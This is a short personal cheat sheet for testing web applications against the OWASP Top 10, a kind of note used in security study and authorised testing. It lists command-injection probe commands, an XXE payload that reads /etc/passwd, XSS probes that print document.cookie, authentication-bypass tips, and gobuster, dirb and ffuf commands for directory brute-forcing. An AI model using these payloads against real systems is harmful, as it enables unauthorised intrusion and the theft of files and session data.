# Intro

This is a cheat sheet for exploitation of OWASP Top 10.

It is the followed by more refined attacks. 

# OWASP Top 10

## Command Injection

If Backend has an insecure function that passes user input directly to shell, it can be exploited.

Try injecting the following:
```
# Linux

whoami
id
ifconfig/ip addr
uname -a
ps -ef


# Windows

whoami
ver
ipconfig
tasklist
netstat -an
```

For bypassing WAF and more advanced injections your best friend is as always: Payload all the thins.

## Broken Authentication

If an attacker is able to find flaws in an authentication mechanism, they would then successfully gain access to other usersâ€™ accounts.

1. Try manipulating session cookies to see if they are predictable
2. Manipulate GET requests containing IDs or usernames
3. Register as user with similar name: add space " admin" or numbers

## Sensitive Data Exposure

1. Search web source code
2. Dirbust for hidden files
3. Dork with Google or Github
4. Try downloading db files with command injection

## XXE injection

It arises from exploiting parsing of ENTITY element. It can be prevented by smart conding practices depending on language used: https://brightsec.com/blog/xxe-prevention/

For payloads refer to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files

1. Detect XXE
```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
2. Exploit 
`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`

## Security Misconfigurations

* Accessible S3 Buckets
* Non functional additional features enabled: like status pages, accounts or privileges
* Default credentials
* Verbose error messages disclosing system properties
* Not using HTTP and cookies security headers
* Non patched systems

## XXS

1. Detect XXS

Alert() is dead: https://portswigger.net/research/alert-is-dead-long-live-print

Use print() instead or use only firefox browser for testing. But this would fail if user uses Chrome and its derivates.

```
#get document cookies

<script>print(document.cookie)</script>

#get host ip
<script>print(window.location.host)</script>


```

## Insecure Deserialization

tbd properly

## Framework identification

* Wappalyzer
* Favicon
```
# grab the favicon like this 
user@machine$ curl https://ip.site.com/sites/favicon/images/favicon.ico | md5sum
```
Then find the framework on: https://wiki.owasp.org/index.php/OWASP_favicon_database

* Inspect Headers
`user@machine$ curl http://MACHINE_IP -v`

## Fuzzing

* https://github.com/ffuf/ffuf
* gobuster
* dibr

## My approach to Dirbusting

1. scan for common directories non recursively with gobuster first:
`gobuster dir -u http://ip -w /usr/share/seclists/Discovery/Web-Content/common.txt`

2. then scan recursively within found directories

`dirb http://ip /usr/share/seclists/Discovery/Web-Content/big.txt -X .html,.php,.cgi`

3. finally you can also fuzz the discovered content or anything else within head or requests

`ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://ip/FUZZ` (FUZZ keyword is there where you want to fuzz)
